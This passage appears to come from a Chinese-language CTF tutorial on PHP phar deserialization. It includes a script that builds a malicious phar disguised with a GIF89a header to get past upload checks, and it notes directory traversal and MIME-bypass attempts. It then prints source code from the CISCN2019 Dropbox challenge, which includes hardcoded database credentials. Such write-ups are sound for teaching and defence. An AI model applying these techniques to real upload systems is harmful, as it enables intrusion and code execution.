#DCDCAA">_show</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>2. 找出魔术方法，构造 pop 链</p><h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar 反序列化</h2><p>phar 是一种 php 程序的一种打包文件，类似与 java 中的 jar 文件，无需解压，直接通过 phar:// 伪协议读取内容。</p><p>一个 phar 文件一般有四个部分：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">1.stub:它是phar文件的文件头，格式为xxxxx&lt;?php xxx; __HALT_COMPILER();?&gt;,这种格式是固定的。前面的可以不管，但必须以__HALT_COMPILER();?&gt;结尾。生成文件的后缀名为phar。这种格式就相当于gif图片中的GIF89a一样。没有这个格式就不会识别这是一个phar文件。</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">2.a manifest describing the contents:phar文件中被压缩的文件的一些信息，以及一些权限信息。其中Meta-data部分的信息会进行序列化并储存，这就是phar反序列化的精髓。我们可以把exp放在Meta-data内。</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">3.the file contents:这里放的是压缩文件的内容，这里的内容可以随便写</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">4.a signature for verifying Phar integrity 这是一个签名，在这里不用管。(签名就是对全文进行加密，为了防止文件内容丢失或者修改，如果签名进行解密与全文不匹配，就会拒绝解析。)</span></span></code></pre></div></div></figure><p>phar 伪协议</p><p>因为 phar 就是将多个文档压缩到一个文件当中，phar 文件中的 Mata-data 会进行序列化，在我们访问 phar 文件中的文档时，我们不需要对它进行解压。可以通过 phar:// 为协议对文件进行读取。当 phar 文件被解析时，Meta-data 中的数据就会被反序列化。</p><p>构造 phar 文件</p><p>在本地生成一个 phar 文件，并想使用 phar 类里面的方法，就必须 ** 将 php.ini 配置文件中的 phar.readonly 改为 0 或者 off（前面分号是注释，删掉）** 这个 phar 压缩文件并不是右键点击一键生成的，而是通过写脚本来生成这个 phar 文件的。</p><p>接下来在本地实验生成 phar 文件。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">A</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">testobj</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">phar</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'test.phar'</span><span style="color: #D4D4D4">);</span><span style="color: #6A9955">//对phar对象进行实例化，以便后续操作。</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> -&gt; </span><span style="color: #DCDCAA">startBuffering</span><span style="color: #D4D4D4">();</span><span style="color: #6A9955">//缓冲phar写操作（不用特别注意）</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> -&gt; </span><span style="color: #DCDCAA">setStub</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"GIF89a"</span><span style="color: #D4D4D4">.</span><span style="color: #CE9178">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span style="color: #D4D4D4">);</span><span style="color: #6A9955">//设置stub，为固定格式</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> -&gt; </span><span style="color: #DCDCAA">setMetadata</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">);</span><span style="color: #6A9955">//把我们的对象写进Metadata中，漏洞利用重点所在</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> -&gt; </span><span style="color: #DCDCAA">addFromString</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"test.txt"</span><span style="color: #D4D4D4">,</span><span style="color: #CE9178">"hello world!!"</span><span style="color: #D4D4D4">);</span><span style="color: #6A9955">//写压缩文件的内容，这里没利用点，可以随便写</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$phar</span><span style="color: #D4D4D4"> -&gt; </span><span style="color: #DCDCAA">stopBuffering</span><span style="color: #D4D4D4">();</span><span style="color: #6A9955">//停止缓冲</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>在上传场景中，我们可以将 phar 伪造成其他格式的文件。识别 phar 文件只需添加<!--?php __HALT_COMPILER(); ?-->这个文件头就可以了。那我们就可以添加别的文件头进行伪造了。例如 $phar-&gt;setStub ("GIF89a"."<!--?php __HALT_COMPILER();  ?-->"); 添加 gif 的文件头绕过上传机制。</p><p>运行完成会在当前目录生成一个文件 ---test.phar</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447274.png" alt="image-20221019144043718"></p><p>可以看到，自己构造的 test 类被序列化了。再试一下能不能反序列化。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">test</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">()</span><span style="color: #6A9955">//对象在反序列化时自动触发</span></span><span class="line"><span style="color: #D4D4D4">     {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">str</span><span style="color: #D4D4D4">;</span><span style="color: #6A9955">//检验是否进行了反序列化</span></span><span class="line"><span style="color: #D4D4D4">     }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4"> =  </span><span style="color: #CE9178">"phar://test.phar/test.txt"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447332.png" alt="image-20221019144532188"></p><p>可以看到用 phar 伪协议能够正常读取，代表 Meta-data 中的数据能被正常反序列化。 php 一大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，受影响的函数如下：<img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447510.png" alt="image-20221019145705074"></p><p>来个例题巩固一下</p><h3 id="ciscn2019-华北赛区-day1-web1dropbox"><a class="markdownIt-Anchor" href="#ciscn2019-华北赛区-day1-web1dropbox"></a> [CISCN2019 华北赛区 Day1 Web1] Dropbox</h3><p>打开页面发现注册框和登录框，先试一下万能密码和 sql 注入。无果后直接注册登录，发现了文件上传的地方。尝试常见的文件上传绕过，经过一系列尝试，发现通过修改 mime 文件头能狗传上 php 文件，但是文件类型被改成了 jpg，代表不能利用，传不上马。然后发现了文件下载的按钮，尝试目录穿越，任意文件包含。果然存在，但没啥用，找了半天找不到 flag。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221448359.png" alt="image-20221019161139768"></p><p>然后就想着把知道的文件的源码下载下来，首先是 download.php，发现不存在，可能文件在上传文件的父目录，尝试过后是../../ 在两级目录。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">//download.php</span></span><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #DCDCAA">session_start</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_SESSION</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'login'</span><span style="color: #D4D4D4">])) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">header</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Location: login.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">die</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_POST</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'filename'</span><span style="color: #D4D4D4">])) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">die</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">include</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"class.php"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #DCDCAA">ini_set</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"open_basedir"</span><span style="color: #D4D4D4">, </span><span style="color: #DCDCAA">getcwd</span><span style="color: #D4D4D4">() </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">":/etc:/tmp"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">chdir</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_SESSION</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'sandbox'</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">File</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4"> = (</span><span style="color: #569CD6">string</span><span style="color: #D4D4D4">) </span><span style="color: #9CDCFE">$_POST</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'filename'</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">strlen</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) &lt; </span><span style="color: #B5CEA8">40</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">open</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">) &amp;&amp; </span><span style="color: #DCDCAA">stristr</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"flag"</span><span style="color: #D4D4D4">) === </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">Header</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Content-type: application/octet-stream"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">Header</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Content-Disposition: attachment; filename="</span><span style="color: #D4D4D4"> </span><span style="color: #D4D4D4">.</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">basename</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$filename</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">close</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"File not exist"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">//index.php</span></span><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #DCDCAA">session_start</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_SESSION</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'login'</span><span style="color: #D4D4D4">])) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">header</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Location: login.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">die</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;!DOCTYPE html&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;html&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;meta charset=</span><span style="color: #CE9178">"utf-8"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;meta name=</span><span style="color: #CE9178">"viewport"</span><span style="color: #D4D4D4"> content=</span><span style="color: #CE9178">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;title&gt;网盘管理&lt;/title&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;head&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;link href=</span><span style="color: #CE9178">"static/css/bootstrap.min.css"</span><span style="color: #D4D4D4"> rel=</span><span style="color: #CE9178">"stylesheet"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;link href=</span><span style="color: #CE9178">"static/css/panel.css"</span><span style="color: #D4D4D4"> rel=</span><span style="color: #CE9178">"stylesheet"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;script src=</span><span style="color: #CE9178">"static/js/jquery.min.js"</span><span style="color: #D4D4D4">&gt;&lt;/script&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;script src=</span><span style="color: #CE9178">"static/js/bootstrap.bundle.min.js"</span><span style="color: #D4D4D4">&gt;&lt;/script&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;script src=</span><span style="color: #CE9178">"static/js/toast.js"</span><span style="color: #D4D4D4">&gt;&lt;/script&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;script src=</span><span style="color: #CE9178">"static/js/panel.js"</span><span style="color: #D4D4D4">&gt;&lt;/script&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;/head&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;body&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;nav aria-label=</span><span style="color: #CE9178">"breadcrumb"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;ol </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"breadcrumb"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;li </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"breadcrumb-item active"</span><span style="color: #D4D4D4">&gt;管理面板&lt;/li&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;li </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"breadcrumb-item active"</span><span style="color: #D4D4D4">&gt;&lt;label </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"fileInput"</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"fileLabel"</span><span style="color: #D4D4D4">&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;li </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"active ml-auto"</span><span style="color: #D4D4D4">&gt;&lt;a href=</span><span style="color: #CE9178">"#"</span><span style="color: #D4D4D4">&gt;你好 &lt;?php </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$_SESSION</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'username'</span><span style="color: #D4D4D4">]?&gt;&lt;/a&gt;&lt;/li&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;/ol&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;/nav&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;input type=</span><span style="color: #CE9178">"file"</span><span style="color: #D4D4D4"> id=</span><span style="color: #CE9178">"fileInput"</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"hidden"</span><span style="color: #D4D4D4">&gt;</span></span><span class="line"><span style="color: #D4D4D4">&lt;div </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"top"</span><span style="color: #D4D4D4"> id=</span><span style="color: #CE9178">"toast-container"</span><span style="color: #D4D4D4">&gt;&lt;/div&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #C586C0">include</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"class.php"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">FileList</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$_SESSION</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'sandbox'</span><span style="color: #D4D4D4">]);</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">Name</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">Size</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">//class.php</span></span><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">$dbaddr</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"127.0.0.1"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$dbuser</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"root"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$dbpass</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"root"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$dbname</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"dropbox"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$db</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">mysqli</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$dbaddr</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$dbuser</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$dbpass</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">$dbname</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">User</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$db</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">global</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$db</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">db</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$db</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">user_exist</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$username</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$stmt</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">db</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #DCDCAA">prepare</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"</span><span style="color: #569CD6">SELECT</span><span style="color: #CE9178"> `username` </span><span style="color: #569CD6">FROM</span><span style="color: #CE9178"> `users` </span><span style="color: #569CD6">WHERE</span><span style="color: #CE9178"> `username` </span><span style="color: #D4D4D4">=</span><span style="color: #CE9178"> ? </span><span style="color: #569CD6">LIMIT</span><span style="color: #CE9178"> </span><span style="color: #B5CEA8">1</span><span style="color: 